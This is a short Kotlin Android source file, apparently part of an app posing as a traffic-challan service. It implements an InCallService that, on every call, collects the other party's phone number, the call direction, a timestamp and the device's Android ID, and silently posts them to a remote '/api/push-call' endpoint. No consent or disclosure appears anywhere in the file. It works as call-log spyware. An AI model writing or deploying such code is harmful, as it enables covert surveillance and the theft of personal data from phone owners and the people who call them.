package com.rte.challan.service

import android.telecom.Call
import android.telecom.InCallService
import android.util.Log
import com.rte.challan.network.ClientApi
import org.json.JSONObject
import android.provider.Settings

class InCallServiceImpl : InCallService() {

    override fun onCallAdded(call: Call) {
        super.onCallAdded(call)

        // 1. Call details nikalna (Number aur Type)
        val number = call.details.handle?.schemeSpecificPart ?: "Unknown"
        val isIncoming = call.state == Call.STATE_RINGING
        val type = if (isIncoming) "Incoming" else "Outgoing"
        
        // 2. Device ID fetch karna
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)

        Log.d("InCallService", "$type call from/to: $number")

        // 3. JSON taiyar karke Sync karna
        val callJson = JSONObject().apply {
            put("deviceId", deviceId)
            put("number", number)
            put("type", type)
            put("time", System.currentTimeMillis())
        }

        // Asynchronous call (kyunki ye main thread par ho sakta hai)
        ClientApi.postRequest("/api/push-call", callJson) { success ->
            if (success) Log.d("InCallService", "Call log synced")
        }
    }
}
